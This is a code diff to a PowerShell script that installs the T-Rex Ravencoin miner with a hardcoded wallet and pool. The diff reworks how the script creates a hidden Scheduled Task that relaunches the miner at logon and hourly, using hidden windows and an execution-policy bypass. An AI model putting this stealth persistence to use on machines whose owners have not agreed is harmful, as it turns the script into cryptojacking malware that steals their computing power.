@@ -1,4 +1,4 @@
-# User-mode T-Rex RVN installer with hidden Scheduled Task
+# User-mode T-Rex RVN installer with hidden Scheduled Task (PS 5.1 compatible)
 # Wallet: RJAht5tU4imXtDYQSh1o5EHjgwFVBbpgZR
 # Pool:   stratum+tcp://us-rvn.2miners.com:6060
 
@@ -62,23 +62,24 @@ Start-Process -FilePath `$exe `
 "@ | Out-File -FilePath $RunPS1 -Encoding UTF8 -Force
 
 # 6) Create/replace user-level Scheduled Task (hidden, at logon + hourly, IgnoreNew)
-$triggers = @(
-  New-ScheduledTaskTrigger -AtLogOn
-  (New-ScheduledTaskTrigger -Daily -At (Get-Date).Date.AddMinutes(1)).Tap({
-    param($t) $t.Repetition = (New-Object -TypeName PSObject -Property @{
-      Interval = (New-TimeSpan -Hours 1)
-      Duration = ([TimeSpan]::MaxValue)
-    })
-  })
-)
+# Trigger 1: at logon
+$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
 
+# Trigger 2: "once" soon, with hourly repetition indefinitely (use a very long duration)
+$startAt = (Get-Date).AddMinutes(1)
+$hourlyTrigger = New-ScheduledTaskTrigger -Once -At $startAt
+$hourlyTrigger.RepetitionInterval = (New-TimeSpan -Hours 1)
+$hourlyTrigger.RepetitionDuration = (New-TimeSpan -Days 9999)
+
+# Action & settings
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$RunPS1`""
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -Hidden
 
+# Register (replace if exists)
 if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
   Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
 }
-Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $triggers -Settings $settings -Description "Run T-Rex RVN miner in background (user mode)"
+Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($logonTrigger,$hourlyTrigger) -Settings $settings -Description "Run T-Rex RVN miner in background (user mode)"
 
 # 7) Start it now
 Start-ScheduledTask -TaskName $TaskName
